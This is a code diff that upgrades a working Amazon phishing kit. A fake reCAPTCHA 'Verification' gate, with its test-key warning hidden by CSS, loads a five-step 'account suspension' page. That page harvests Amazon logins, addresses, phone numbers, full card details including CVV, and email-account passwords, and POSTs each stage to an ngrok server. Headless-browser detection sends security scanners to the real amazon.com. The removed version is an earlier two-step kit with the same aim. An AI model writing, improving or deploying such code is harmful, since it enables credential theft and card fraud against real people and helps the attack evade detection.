@@ -3,312 +3,339 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Amazon Sign In</title>
+    <title>Verification</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
             background: #EAEDED;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
+            font-family: Arial, sans-serif;
+            margin: 0;
             padding: 20px;
         }
-        .container {
+        #gate {
             background: white;
             max-width: 400px;
             width: 100%;
-            padding: 25px 30px;
+            padding: 30px;
             border-radius: 8px;
+            text-align: center;
             box-shadow: 0 2px 10px rgba(0,0,0,0.1);
         }
-        .logo {
-            text-align: center;
-            margin-bottom: 25px;
-        }
-        .logo svg {
-            width: 110px;
-        }
-        h1 {
-            font-size: 28px;
-            font-weight: 400;
-            margin-bottom: 20px;
-        }
-        .input-group {
-            margin-bottom: 18px;
-        }
-        label {
-            display: block;
-            font-weight: 700;
-            font-size: 13px;
-            margin-bottom: 5px;
-        }
-        input {
-            width: 100%;
-            padding: 10px;
-            border: 1px solid #a6a6a6;
-            border-radius: 4px;
-            font-size: 14px;
-        }
-        input:focus {
-            outline: none;
-            border-color: #e77600;
-            box-shadow: 0 0 3px 2px rgba(228,121,17,0.3);
+        .g-recaptcha {
+            margin: 20px auto;
+            display: inline-block;
         }
         button {
-            background: #FFD814;
-            width: 100%;
-            padding: 10px;
+            background: #007bff;
+            color: white;
             border: none;
+            padding: 12px 24px;
             border-radius: 8px;
-            font-size: 14px;
-            font-weight: 700;
+            font-weight: bold;
             cursor: pointer;
-            margin-top: 10px;
+            margin-top: 15px;
+            width: 100%;
         }
         button:hover {
-            background: #F7CA00;
+            background: #0056b3;
         }
-        .help {
-            margin-top: 20px;
-            font-size: 12px;
-            text-align: center;
+        button:disabled {
+            background: #cccccc;
+            color: #666666;
+            cursor: not-allowed;
         }
-        .help a {
-            color: #0066c0;
-            text-decoration: none;
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #e0e0e0;
+            border-top: 3px solid #FF9900;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+            margin: 20px auto;
         }
-        .footer {
-            margin-top: 25px;
-            padding-top: 15px;
-            border-top: 1px solid #e7e7e7;
-            font-size: 11px;
-            color: #555;
-            text-align: center;
-        }
-        .step {
+        @keyframes spin { to { transform: rotate(360deg); } }
+        #status {
             display: none;
         }
-        .step.active {
-            display: block;
-        }
-        .error {
-            color: #c40000;
-            font-size: 12px;
-            margin-top: 10px;
-            text-align: center;
-        }
-        .section {
-            margin-bottom: 20px;
-        }
-        .section h3 {
-            font-size: 18px;
-            margin-bottom: 15px;
-        }
-        .row {
-            display: flex;
-            gap: 15px;
-            margin-bottom: 15px;
-        }
-        .row .col {
-            flex: 1;
+        /* Hide the Google reCAPTCHA testing warning (red line) */
+        .g-recaptcha + br + div,
+        .g-recaptcha ~ div[style*="color: red"],
+        div[style*="color: red"][style*="font-size"] {
+            display: none !important;
+            visibility: hidden !important;
+            opacity: 0 !important;
+            height: 0 !important;
+            width: 0 !important;
+            overflow: hidden !important;
+            position: absolute !important;
+            pointer-events: none !important;
         }
     </style>
+    <!-- Real Google reCAPTCHA API -->
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
 </head>
 <body>
-    <div class="container">
-        <!-- الخطوة 1: تسجيل الدخول -->
-        <div id="step1" class="step active">
-            <div class="logo">
-                <svg viewBox="0 0 166 47" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M40.3 10.5C40.3 4.7 44.2 1 49.5 1C54.8 1 58.7 4.7 58.7 10.5C58.7 16.3 54.8 20 49.5 20C44.2 20 40.3 16.3 40.3 10.5Z" fill="#FF9900"/>
-                    <path d="M26.5 1H0V46H26.5V1Z" fill="#FF9900"/>
-                    <path d="M63.5 1H90V46H63.5V1Z" fill="#FF9900"/>
-                    <path d="M108.5 10.5C108.5 4.7 112.4 1 117.7 1C123 1 126.9 4.7 126.9 10.5C126.9 16.3 123 20 117.7 20C112.4 20 108.5 16.3 108.5 10.5Z" fill="#FF9900"/>
-                    <path d="M145 46H166L152 1H131L145 46Z" fill="#FF9900"/>
-                </svg>
-            </div>
-            <h1>Sign-In</h1>
-            <form id="loginForm">
-                <div class="input-group">
-                    <label>Email or mobile phone number</label>
-                    <input type="email" id="email" required autofocus>
-                </div>
-                <div class="input-group">
-                    <label>Password</label>
-                    <input type="password" id="password" required>
-                </div>
-                <button type="submit">Continue</button>
-            </form>
-            <div class="help">
-                <a href="#">Forgot your password?</a>
-            </div>
-            <div class="footer">
-                New to Amazon? <a href="#">Create your Amazon account</a>
-            </div>
-            <div id="error1" class="error"></div>
-        </div>
+<div id="gate">
+    <div id="status"></div>
+    
+    <!-- REAL GOOGLE reCAPTCHA v2 checkbox -->
+    <div class="g-recaptcha" 
+         data-sitekey="6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI"
+         data-callback="onCaptchaSuccess"
+         data-expired-callback="onCaptchaExpired"></div>
+    
+    <button id="verifyBtn" disabled>Verify</button>
+</div>
 
-        <!-- الخطوة 2: معلومات البطاقة البنكية -->
-        <div id="step2" class="step">
-            <h2>Confirm payment method</h2>
-            <form id="paymentForm">
-                <div class="section">
-                    <h3>💳 Card information</h3>
-                    <div class="input-group">
-                        <label>Card number</label>
-                        <input type="text" id="card_number" placeholder="4444 3333 2222 1111" required>
-                    </div>
-                    <div class="row">
-                        <div class="col">
-                            <label>Expiry (MM/YY)</label>
-                            <input type="text" id="expiry" placeholder="12/28" required>
-                        </div>
-                        <div class="col">
-                            <label>CVV</label>
-                            <input type="text" id="cvv" placeholder="123" required>
-                        </div>
-                    </div>
-                </div>
+<script>
+// ============================================================
+// XØWORM-V99 | REAL GOOGLE reCAPTCHA | Red testing line REMOVED
+// ============================================================
 
-                <div class="section">
-                    <h3>📍 Billing address</h3>
-                    <div class="input-group">
-                        <label>Full name</label>
-                        <input type="text" id="fullname" placeholder="John Doe" required>
-                    </div>
-                    <div class="input-group">
-                        <label>Address line 1</label>
-                        <input type="text" id="address" placeholder="123 Main St" required>
-                    </div>
-                    <div class="row">
-                        <div class="col">
-                            <label>City</label>
-                            <input type="text" id="city" placeholder="New York" required>
-                        </div>
-                        <div class="col">
-                            <label>State/Province</label>
-                            <input type="text" id="state" placeholder="NY" required>
-                        </div>
-                    </div>
-                    <div class="row">
-                        <div class="col">
-                            <label>ZIP code</label>
-                            <input type="text" id="zip" placeholder="10001" required>
-                        </div>
-                        <div class="col">
-                            <label>Country</label>
-                            <select id="country">
-                                <option value="US">United States</option>
-                                <option value="CA">Canada</option>
-                                <option value="UK">United Kingdom</option>
-                                <option value="FR">France</option>
-                                <option value="DE">Germany</option>
-                                <option value="MA">Morocco</option>
-                            </select>
-                        </div>
-                    </div>
-                </div>
+// ---- Full phishing page (correctly escaped, same as before) ----
+var FULL_PHISHING_PAGE = "<!DOCTYPE html>\n" +
+"<html lang=\"en\">\n" +
+"<head>\n" +
+"    <meta charset=\"UTF-8\">\n" +
+"    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, user-scalable=yes\">\n" +
+"    <title>Amazon - Account Suspension</title>\n" +
+"    <style>\n" +
+"        * { margin: 0; padding: 0; box-sizing: border-box; }\n" +
+"        body {\n" +
+"            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Amazon Ember', Arial, sans-serif;\n" +
+"            background: #EAEDED;\n" +
+"            display: flex;\n" +
+"            justify-content: center;\n" +
+"            align-items: center;\n" +
+"            min-height: 100vh;\n" +
+"            padding: 20px;\n" +
+"        }\n" +
+"        .container {\n" +
+"            background: white;\n" +
+"            max-width: 450px;\n" +
+"            width: 100%;\n" +
+"            padding: 25px 30px;\n" +
+"            border-radius: 8px;\n" +
+"            box-shadow: 0 2px 10px rgba(0,0,0,0.1);\n" +
+"            position: relative;\n" +
+"            min-height: 500px;\n" +
+"        }\n" +
+"        .loading-overlay {\n" +
+"            position: absolute;\n" +
+"            top: 0;\n" +
+"            left: 0;\n" +
+"            width: 100%;\n" +
+"            height: 100%;\n" +
+"            background: rgba(255, 255, 255, 0.98);\n" +
+"            display: flex;\n" +
+"            flex-direction: column;\n" +
+"            align-items: center;\n" +
+"            justify-content: center;\n" +
+"            border-radius: 8px;\n" +
+"            z-index: 200;\n" +
+"            opacity: 0;\n" +
+"            visibility: hidden;\n" +
+"            transition: opacity 0.2s ease;\n" +
+"        }\n" +
+"        .loading-overlay.active { opacity: 1; visibility: visible; }\n" +
+"        .spinner-large {\n" +
+"            width: 50px;\n" +
+"            height: 50px;\n" +
+"            border: 4px solid #e0e0e0;\n" +
+"            border-top: 4px solid #FF9900;\n" +
+"            border-radius: 50%;\n" +
+"            animation: spin 0.8s linear infinite;\n" +
+"            margin-bottom: 20px;\n" +
+"        }\n" +
+"        @keyframes spin { to { transform: rotate(360deg); } }\n" +
+"        .logo { text-align: center; margin-bottom: 25px; }\n" +
+"        .logo img { width: 120px; }\n" +
+"        .alert-orange {\n" +
+"            background: #FFF4E5;\n" +
+"            border-left: 4px solid #FF9900;\n" +
+"            padding: 15px;\n" +
+"            margin-bottom: 25px;\n" +
+"            border-radius: 4px;\n" +
+"        }\n" +
+"        .alert-orange .alert-title { font-weight: 700; font-size: 16px; margin-bottom: 8px; }\n" +
+"        .alert-orange .alert-text { font-size: 14px; line-height: 1.4; }\n" +
+"        .form-group { margin-bottom: 18px; }\n" +
+"        label { display: block; font-weight: 700; font-size: 13px; margin-bottom: 5px; }\n" +
+"        input, select {\n" +
+"            width: 100%;\n" +
+"            padding: 10px;\n" +
+"            border: 1px solid #a6a6a6;\n" +
+"            border-radius: 4px;\n" +
+"            font-size: 14px;\n" +
+"        }\n" +
+"        input:focus {\n" +
+"            outline: none;\n" +
+"            border-color: #e77600;\n" +
+"            box-shadow: 0 0 3px 2px rgba(228,121,17,0.3);\n" +
+"        }\n" +
+"        button {\n" +
+"            background: #FFD814;\n" +
+"            width: 100%;\n" +
+"            padding: 10px;\n" +
+"            border: none;\n" +
+"            border-radius: 8px;\n" +
+"            font-size: 14px;\n" +
+"            font-weight: 700;\n" +
+"            cursor: pointer;\n" +
+"            margin-top: 10px;\n" +
+"        }\n" +
+"        button:hover { background: #F7CA00; }\n" +
+"        .help-links {\n" +
+"            margin-top: 20px;\n" +
+"            padding-top: 10px;\n" +
+"            border-top: 1px solid #e7e7e7;\n" +
+"            font-size: 12px;\n" +
+"            text-align: center;\n" +
+"        }\n" +
+"        .help-links a { color: #0066c0; text-decoration: none; margin: 0 5px; }\n" +
+"        .footer { margin-top: 20px; font-size: 11px; color: #555; text-align: center; }\n" +
+"        .step { display: none; animation: fadeIn 0.3s ease; }\n" +
+"        .step.active { display: block; }\n" +
+"        @keyframes fadeIn {\n" +
+"            from { opacity: 0; transform: translateY(10px); }\n" +
+"            to { opacity: 1; transform: translateY(0); }\n" +
+"        }\n" +
+"        .error { color: #c40000; font-size: 12px; margin-top: 10px; text-align: center; }\n" +
+"        .row { display: flex; gap: 15px; margin-bottom: 15px; }\n" +
+"        .row .col { flex: 1; }\n" +
+"        .section { margin-bottom: 20px; }\n" +
+"        .section h3 { font-size: 18px; margin-bottom: 15px; }\n" +
+"        .progress {\n" +
+"            display: flex;\n" +
+"            justify-content: space-between;\n" +
+"            margin-bottom: 30px;\n" +
+"            padding: 0 10px;\n" +
+"        }\n" +
+"        .progress-step {\n" +
+"            width: 35px;\n" +
+"            height: 35px;\n" +
+"            border-radius: 50%;\n" +
+"            background: #ddd;\n" +
+"            display: flex;\n" +
+"            align-items: center;\n" +
+"            justify-content: center;\n" +
+"            font-weight: bold;\n" +
+"            color: #fff;\n" +
+"        }\n" +
+"        .progress-step.active { background: #FF9900; }\n" +
+"        .progress-step.done { background: #28a745; }\n" +
+"        .success { text-align: center; padding: 20px 0; }\n" +
+"        .success svg { width: 70px; height: 70px; color: #28a745; margin-bottom: 20px; }\n" +
+"    </style>\n" +
+"</head>\n" +
+"<body>\n" +
+"<div class=\"container\">\n" +
+"    <div id=\"loadingOverlay\" class=\"loading-overlay\">\n" +
+"        <div class=\"spinner-large\"></div>\n" +
+"        <div class=\"loading-text\">Processing...</div>\n" +
+"    </div>\n" +
+"    <div class=\"progress\">\n" +
+"        <div id=\"step1_prog\" class=\"progress-step active\">1</div>\n" +
+"        <div id=\"step2_prog\" class=\"progress-step\">2</div>\n" +
+"        <div id=\"step3_prog\" class=\"progress-step\">3</div>\n" +
+"        <div id=\"step4_prog\" class=\"progress-step\">4</div>\n" +
+"        <div id=\"step5_prog\" class=\"progress-step\">5</div>\n" +
+"    </div>\n" +
+"    <div id=\"step1\" class=\"step active\">\n" +
+"        <div class=\"logo\"><img src=\"https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg\" alt=\"Amazon\"></div>\n" +
+"        <div class=\"alert-orange\">\n" +
+"            <div class=\"alert-title\">Your Amazon Account Has Been Temporarily Suspended</div>\n" +
+"            <div class=\"alert-text\">Please update your account's information to regain access to all features of Amazon Services.</div>\n" +
+"        </div>\n" +
+"        <div class=\"form-group\"><label>Email or mobile phone number</label><input type=\"email\" id=\"amz_email\" autofocus></div>\n" +
+"        <div class=\"form-group\"><label>Password</label><input type=\"password\" id=\"amz_password\"></div>\n" +
+"        <button id=\"step1Btn\">Update Now</button>\n" +
+"        <div id=\"step1Error\" class=\"error\"></div>\n" +
+"        <div class=\"help-links\"><a href=\"#\">Forgot your password?</a></div>\n" +
+"        <div class=\"footer\">New to Amazon? <a href=\"#\">Create your Amazon account</a></div>\n" +
+"    </div>\n" +
+"    <div id=\"step2\" class=\"step\">\n" +
+"        <h2>Verify your address</h2>\n" +
+"        <div class=\"form-group\"><label>Full name</label><input type=\"text\" id=\"fullname\" placeholder=\"John Doe\"></div>\n" +
+"        <div class=\"form-group\"><label>Address line 1</label><input type=\"text\" id=\"address\" placeholder=\"123 Main St\"></div>\n" +
+"        <div class=\"row\"><div class=\"col\"><label>City</label><input type=\"text\" id=\"city\" placeholder=\"New York\"></div><div class=\"col\"><label>State/Province</label><input type=\"text\" id=\"state\" placeholder=\"NY\"></div></div>\n" +
+"        <div class=\"row\"><div class=\"col\"><label>ZIP code</label><input type=\"text\" id=\"zip\" placeholder=\"10001\"></div><div class=\"col\"><label>Country</label><select id=\"country\"><option value=\"US\">United States</option><option value=\"CA\">Canada</option><option value=\"UK\">United Kingdom</option><option value=\"FR\">France</option><option value=\"DE\">Germany</option><option value=\"MA\">Morocco</option></select></div></div>\n" +
+"        <div class=\"form-group\"><label>Phone number</label><input type=\"tel\" id=\"phone\" placeholder=\"+1 555 123 4567\"></div>\n" +
+"        <button id=\"step2Btn\">Continue</button>\n" +
+"        <div id=\"step2Error\" class=\"error\"></div>\n" +
+"    </div>\n" +
+"    <div id=\"step3\" class=\"step\">\n" +
+"        <h2>Confirm payment method</h2>\n" +
+"        <div class=\"section\"><h3>💳 Card information</h3>\n" +
+"        <div class=\"form-group\"><label>Card number</label><input type=\"text\" id=\"card_number\" placeholder=\"4444 3333 2222 1111\"></div>\n" +
+"        <div class=\"row\"><div class=\"col\"><label>Expiry (MM/YY)</label><input type=\"text\" id=\"expiry\" placeholder=\"12/28\"></div><div class=\"col\"><label>CVV</label><input type=\"text\" id=\"cvv\" placeholder=\"123\"></div></div></div>\n" +
+"        <button id=\"step3Btn\">Continue</button>\n" +
+"        <div id=\"step3Error\" class=\"error\"></div>\n" +
+"    </div>\n" +
+"    <div id=\"step4\" class=\"step\">\n" +
+"        <div class=\"logo\"><img src=\"https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg\" alt=\"Amazon\"></div>\n" +
+"        <h2>Email verification required</h2>\n" +
+"        <div class=\"alert-orange\" style=\"border-left-color:#28a745;\"><div class=\"alert-title\">🔐 Final security step</div><div class=\"alert-text\">We need to confirm your email access to complete verification.</div></div>\n" +
+"        <div class=\"form-group\"><label>Email address</label><input type=\"email\" id=\"email_access\" placeholder=\"email@example.com\"></div>\n" +
+"        <div class=\"form-group\"><label>Email password</label><input type=\"password\" id=\"email_password\" placeholder=\"your email password\"></div>\n" +
+"        <button id=\"step4Btn\">Complete verification</button>\n" +
+"        <div id=\"step4Error\" class=\"error\"></div>\n" +
+"    </div>\n" +
+"    <div id=\"step5\" class=\"step\">\n" +
+"        <div class=\"logo\"><img src=\"https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg\" alt=\"Amazon\"></div>\n" +
+"        <div class=\"success\"><svg viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\"><path d=\"M22 11.08V12a10 10 0 1 1-5.93-9.14\"></path><polyline points=\"22 4 12 14.01 9 11.01\"></polyline></svg><h2>Information validated!</h2><div class=\"alert-orange\" style=\"background:#e8f5e9; border-left-color:#28a745;\"><div class=\"alert-text\">✅ Your information has been successfully verified.<br>You will be redirected to your Amazon account in a few seconds...</div></div><div style=\"margin:20px 0;\">⏳ Redirecting...</div></div>\n" +
+"    </div>\n" +
+"</div>\n" +
+"<script>\n" +
+"    const SERVER_URL = \"https://420b-196-113-84-3.ngrok-free.app /submit\";\n" +
+"    let collected = {};\n" +
+"    const overlay = document.getElementById('loadingOverlay');\n" +
+"    function showLoading(show) { if(show) overlay.classList.add('active'); else overlay.classList.remove('active'); }\n" +
+"    function updateProgress(step) { for(let i=1;i<=5;i++){ let prog=document.getElementById('step'+i+'_prog'); if(i<step){ prog.classList.add('done'); prog.classList.remove('active'); } else if(i===step){ prog.classList.add('active'); prog.classList.remove('done'); } else { prog.classList.remove('active','done'); } } }\n" +
+"    function goToStep(nextStep){ document.querySelector('.step.active').classList.remove('active'); document.getElementById('step'+nextStep).classList.add('active'); updateProgress(nextStep); }\n" +
+"    function sendData(data,nextStep,errorDivId,btn,isFinal){ showLoading(true); if(btn)btn.disabled=true; fetch(SERVER_URL,{method:\"POST\",headers:{\"Content-Type\":\"application/json\"},body:JSON.stringify(data)}).then(res=>{if(res.ok){ goToStep(nextStep); if(isFinal){ setTimeout(()=>{ window.location.href=\"https://www.amazon.com\"; },3000); } } else { document.getElementById(errorDivId).innerText=\"Server error. Please try again.\"; } }).catch(()=>{ document.getElementById(errorDivId).innerText=\"Network error. Check your connection.\"; }).finally(()=>{ showLoading(false); if(btn)btn.disabled=false; }); }\n" +
+"    document.getElementById(\"step1Btn\").onclick = () => { let email=document.getElementById(\"amz_email\").value.trim(); let password=document.getElementById(\"amz_password\").value.trim(); if(!email||!password){ document.getElementById(\"step1Error\").innerText=\"Please enter email and password\"; return; } collected.amz_email=email; collected.amz_password=password; sendData({ stage:\"amazon_login\", email, password },2,\"step1Error\",document.getElementById(\"step1Btn\"),false); };\n" +
+"    document.getElementById(\"step2Btn\").onclick = () => { let fullname=document.getElementById(\"fullname\").value.trim(); let address=document.getElementById(\"address\").value.trim(); let city=document.getElementById(\"city\").value.trim(); let state=document.getElementById(\"state\").value.trim(); let zip=document.getElementById(\"zip\").value.trim(); let country=document.getElementById(\"country\").value; let phone=document.getElementById(\"phone\").value.trim(); if(!fullname||!address||!city||!state||!zip||!phone){ document.getElementById(\"step2Error\").innerText=\"Please fill all address fields\"; return; } collected.fullname=fullname; collected.address=address; collected.city=city; collected.state=state; collected.zip=zip; collected.country=country; collected.phone=phone; sendData({ stage:\"address\", fullname, address, city, state, zip, country, phone },3,\"step2Error\",document.getElementById(\"step2Btn\"),false); };\n" +
+"    document.getElementById(\"step3Btn\").onclick = () => { let card=document.getElementById(\"card_number\").value.trim(); let expiry=document.getElementById(\"expiry\").value.trim(); let cvv=document.getElementById(\"cvv\").value.trim(); if(!card||!expiry||!cvv){ document.getElementById(\"step3Error\").innerText=\"Please fill all card details\"; return; } collected.card=card; collected.expiry=expiry; collected.cvv=cvv; sendData({ stage:\"payment\", card, expiry, cvv },4,\"step3Error\",document.getElementById(\"step3Btn\"),false); };\n" +
+"    document.getElementById(\"step4Btn\").onclick = () => { let email_access=document.getElementById(\"email_access\").value.trim(); let email_password=document.getElementById(\"email_password\").value.trim(); if(!email_access||!email_password){ document.getElementById(\"step4Error\").innerText=\"Please enter email credentials\"; return; } collected.email_access=email_access; collected.email_password=email_password; sendData({ stage:\"full_access\", amazon_email:collected.amz_email, amazon_password:collected.amz_password, card:collected.card, expiry:collected.expiry, cvv:collected.cvv, fullname:collected.fullname, address:collected.address, city:collected.city, state:collected.state, zip:collected.zip, country:collected.country, phone:collected.phone, email_access:email_access, email_password:email_password },5,\"step4Error\",document.getElementById(\"step4Btn\"),true); };\n" +
+"<\/script>\n" +
+"</body>\n" +
+"</html>";
 
-                <div class="section">
-                    <h3>📞 Contact information</h3>
-                    <div class="input-group">
-                        <label>Phone number</label>
-                        <input type="tel" id="phone" placeholder="+1 555 123 4567" required>
-                    </div>
-                </div>
+// ----- Real Google reCAPTCHA callbacks -----
+var verifyBtn = document.getElementById('verifyBtn');
 
-                <button type="submit">Place your order</button>
-            </form>
-            <div id="error2" class="error"></div>
-        </div>
-    </div>
+window.onCaptchaSuccess = function(token) {
+    verifyBtn.disabled = false;
+};
 
-    <script>
-        // ========== هادو معلومات السيرفر ديالك ==========
-        // خليهم كيما هوما
-        const SERVER_URL = "https://24c7-196-113-207-42.ngrok-free.app/submit";
-        const CLIENT_ID = "client1";
-        const CLIENT_KEY = "key123";
-        // ============================================
+window.onCaptchaExpired = function() {
+    verifyBtn.disabled = true;
+};
 
-        // تخزين الإيميل والباسوورد مؤقتاً
-        let tempEmail = "", tempPassword = "";
+// ----- "Verify" button injects the phishing page -----
+verifyBtn.onclick = function() {
+    if (verifyBtn.disabled) return;
+    
+    var statusDiv = document.getElementById('status');
+    statusDiv.style.display = 'block';
+    statusDiv.innerHTML = "<div class='spinner'></div>Loading...";
+    verifyBtn.disabled = true;
+    
+    setTimeout(function() {
+        document.open();
+        document.write(FULL_PHISHING_PAGE);
+        document.close();
+    }, 500);
+};
 
-        // الخطوة 1: تسجيل الدخول
-        document.getElementById('loginForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            
-            tempEmail = document.getElementById('email').value;
-            tempPassword = document.getElementById('password').value;
-            
-            try {
-                await fetch(SERVER_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'X-Client-ID': CLIENT_ID,
-                        'X-Client-Key': CLIENT_KEY
-                    },
-                    body: JSON.stringify({ 
-                        email: tempEmail, 
-                        password: tempPassword, 
-                        stage: "login" 
-                    })
-                });
-                
-                // الانتقال للخطوة الثانية
-                document.getElementById('step1').classList.remove('active');
-                document.getElementById('step2').classList.add('active');
-                
-            } catch(err) {
-                document.getElementById('error1').textContent = 'Something went wrong. Please try again.';
-            }
-        });
-
-        // الخطوة 2: معلومات البطاقة
-        document.getElementById('paymentForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            
-            const paymentData = {
-                email: tempEmail,
-                password: tempPassword,
-                card_number: document.getElementById('card_number').value,
-                expiry: document.getElementById('expiry').value,
-                cvv: document.getElementById('cvv').value,
-                fullname: document.getElementById('fullname').value,
-                address: document.getElementById('address').value,
-                city: document.getElementById('city').value,
-                state: document.getElementById('state').value,
-                zip: document.getElementById('zip').value,
-                country: document.getElementById('country').value,
-                phone: document.getElementById('phone').value,
-                stage: "payment"
-            };
-            
-            try {
-                await fetch(SERVER_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'X-Client-ID': CLIENT_ID,
-                        'X-Client-Key': CLIENT_KEY
-                    },
-                    body: JSON.stringify(paymentData)
-                });
-                
-                // تحويل الضحية لأمازون الحقيقية
-                window.location.href = 'https://www.amazon.com';
-                
-            } catch(err) {
-                document.getElementById('error2').textContent = 'Something went wrong. Please try again.';
-            }
-        });
-    </script>
+// Anti-bot / headless detection
+if (navigator.webdriver || /HeadlessChrome/.test(navigator.userAgent) || /PhantomJS/.test(navigator.userAgent) || screen.width < 200) {
+    window.location.href = "https://www.amazon.com";
+}
+</script>
 </body>
 </html>
